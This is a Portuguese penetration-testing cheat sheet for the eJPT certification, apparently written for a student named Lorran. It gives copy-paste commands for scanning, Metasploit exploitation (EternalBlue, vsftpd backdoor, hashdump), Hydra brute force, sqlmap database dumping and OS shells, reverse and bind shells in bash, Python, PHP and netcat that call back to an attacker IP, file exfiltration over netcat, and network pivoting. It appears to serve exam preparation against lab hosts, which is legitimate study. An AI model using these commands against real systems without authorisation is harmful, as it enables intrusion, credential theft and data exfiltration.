# CHEATSHEET eJPT - LIBERTUS
Lorran, cola esses comandos EXATOS. Cada bloco e uma ferramenta.

===================================================================
## 1. NMAP - RECONHECIMENTO
===================================================================

### Varredura inicial rapida (toda rede)
nmap -sn 10.10.10.0/24

### Varredura completa de portas num alvo
nmap -sC -sV -p- -T4 10.10.10.X -oN scan_full.txt

### Top 1000 portas rapido
nmap -sC -sV -T4 10.10.10.X -oN scan_fast.txt

### Detectar OS
nmap -O -sV 10.10.10.X

### Script smb-vuln (MS17-010 e outros)
nmap --script smb-vuln* -p 445 10.10.10.X
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.X

### Scripts FTP
nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 10.10.10.X

### Scripts HTTP
nmap --script http-title,http-headers,http-methods -p 80,8080,443 10.10.10.X
nmap --script http-enum -p 80,8080 10.10.10.X

### UDP scan (servicos SNMP/DNS)
nmap -sU -T4 --top-ports 20 10.10.10.X

### Salvar tudo (3 formatos)
nmap -sC -sV -p- 10.10.10.X -oA resultado_completo

===================================================================
## 2. METASPLOIT - FLUXO COMPLETO
===================================================================

### Iniciar
msfconsole -q

### Comandos basicos dentro do msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
info
show options
set RHOSTS 10.10.10.X
set LHOST 10.10.10.SUA_IP
run

### MS17-010 (EternalBlue) - passo a passo
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.X
set LHOST 10.10.10.SUA_IP
set LPORT 4444
set payload windows/x64/meterpreter/reverse_tcp
run

### Apos Meterpreter abrir:
sysinfo
getuid
hashdump
shell
ps
migrate <PID>
background        # volta pro msfconsole sem matar sessao

### FTP exploit (vsftpd 2.3.4)
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.X
run

### SSH exploit via credenciais
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.10.10.X
set USERNAME admin
set PASSWORD password123
set STOP_ON_SUCCESS true
run

### Listar e interagir com sessoes
sessions -l
sessions -i 1

### Buscar exploit pelo nome de servico
search type:exploit name:apache
search type:exploit platform:windows smb

===================================================================
## 3. HYDRA - BRUTE FORCE
===================================================================

### SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.X
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.X -t 4

### FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.X
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.X

### HTTP POST (formulario de login)
# Primeiro capture o request com Burp ou inspect
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.X http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

### HTTP GET (basic auth)
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://10.10.10.X/admin

### Flags uteis
-t 4      # threads (menos = mais estavel)
-t 16     # threads (mais rapido, pode travar)
-V        # verbose, mostra cada tentativa
-f        # para apos primeira senha encontrada
-s 2222   # porta customizada
-o result_hydra.txt  # salvar resultado

### Exemplo completo SSH com porta customizada
hydra -l root -P /usr/share/wordlists/rockyou.txt -s 2222 -f -t 4 ssh://10.10.10.X

===================================================================
## 4. GOBUSTER - ENUMERACAO WEB
===================================================================

### Enumeracao de diretorios basica
gobuster dir -u http://10.10.10.X -w /usr/share/wordlists/dirb/common.txt

### Com extensoes de arquivo
gobuster dir -u http://10.10.10.X -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak

### Mais completo (SecLists)
gobuster dir -u http://10.10.10.X -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50

### Subdominios
gobuster dns -d dominio.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

### Flags importantes
-t 50           # threads
-o output.txt   # salvar resultado
-x php,html     # extensoes
--timeout 10s   # timeout por request
-k              # ignorar SSL
-H "Cookie: session=abc123"  # cookie de autenticacao
-u http://alvo  # URL alvo

### WORDLISTS ALTERNATIVAS (se nao tiver SecLists)
# Instalar: sudo apt install seclists wordlists
# Wordlists comuns:
# /usr/share/wordlists/dirb/common.txt
# /usr/share/wordlists/dirb/big.txt
# /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# /usr/share/seclists/Discovery/Web-Content/common.txt
# /usr/share/seclists/Discovery/Web-Content/big.txt

===================================================================
## 5. SQLMAP - SQL INJECTION
===================================================================

### Deteccao basica (GET)
sqlmap -u "http://10.10.10.X/page.php?id=1" --batch

### Deteccao em POST
sqlmap -u "http://10.10.10.X/login.php" --data="user=admin&pass=test" --batch

### Com cookie de autenticacao
sqlmap -u "http://10.10.10.X/page.php?id=1" --cookie="PHPSESSID=abc123" --batch

### Listar bancos de dados
sqlmap -u "http://10.10.10.X/page.php?id=1" --dbs --batch

### Listar tabelas de um banco
sqlmap -u "http://10.10.10.X/page.php?id=1" -D nome_banco --tables --batch

### Listar colunas de uma tabela
sqlmap -u "http://10.10.10.X/page.php?id=1" -D nome_banco -T usuarios --columns --batch

### Extrair dados de uma tabela
sqlmap -u "http://10.10.10.X/page.php?id=1" -D nome_banco -T usuarios --dump --batch

### Tentar shell
sqlmap -u "http://10.10.10.X/page.php?id=1" --os-shell --batch

### Flags uteis
--batch         # sem perguntas interativas (responde automatico)
--level=5       # nivel de teste (1-5, padrao=1)
--risk=3        # risco (1-3, padrao=1)
--dbms=mysql    # forcar banco especifico
--threads=5     # paralelismo
--forms         # detectar forms automaticamente
-p "user"       # parametro especifico para testar

===================================================================
## 6. NETCAT - SHELLS
===================================================================

### Reverse Shell (ALVO se conecta a VOCE)
# Na SUA maquina (escuta):
nc -lvnp 4444

# No ALVO execute (bash reverse shell):
bash -i >& /dev/tcp/SEU_IP/4444 0>&1

# Ou via nc (se alvo tiver nc com -e):
nc SEU_IP 4444 -e /bin/bash

# Reverse shell Python (se alvo tiver python):
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("SEU_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Reverse shell PHP (em webshell/RCE):
php -r '$sock=fsockopen("SEU_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

### Bind Shell (VOCE se conecta ao ALVO)
# No ALVO execute:
nc -lvnp 4444 -e /bin/bash

# Na SUA maquina:
nc 10.10.10.X 4444

### Transferencia de arquivo via netcat
# Receber arquivo (sua maquina):
nc -lvnp 9999 > arquivo_recebido

# Enviar arquivo (alvo):
nc SEU_IP 9999 < arquivo_enviar

### Verificar porta aberta
nc -zv 10.10.10.X 80
nc -zv 10.10.10.X 1-1000

### Shell TTY melhorada (apos conseguir shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Depois: Ctrl+Z
stty raw -echo; fg
# Depois: reset
export TERM=xterm

===================================================================
## 7. PIVOTING COM METASPLOIT
===================================================================

### Conceito: voce esta em 10.10.10.X (maquina comprometida)
### e quer acessar 192.168.1.0/24 (rede interna)

### Passo 1: Ter sessao Meterpreter ativa
sessions -l
sessions -i 1   # entrar na sessao

### Passo 2: Ver interfaces da maquina comprometida
ipconfig   # Windows
ifconfig   # Linux

### Passo 3: Adicionar rota via sessao
# Dentro do meterpreter:
background
route add 192.168.1.0/24 1   # 1 = ID da sessao

# Ou usar autoroute:
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.1.0
set NETMASK 255.255.255.0
run

### Passo 4: Verificar rotas
route print

### Passo 5: Scanner pela rede pivotada
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,445,3389
run

### Passo 6: Portfwd (tunel de porta especifica)
# Dentro do meterpreter:
portfwd add -l 8445 -r 192.168.1.X -p 445
# Agora localhost:8445 = 192.168.1.X:445

### Passo 7: Usar SOCKS proxy (acesso total)
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run
# Depois use proxychains:
proxychains nmap -sT 192.168.1.X

===================================================================
FIM DO CHEATSHEET
Lorran, me manda o output de cada comando e eu analiso o proximo passo.
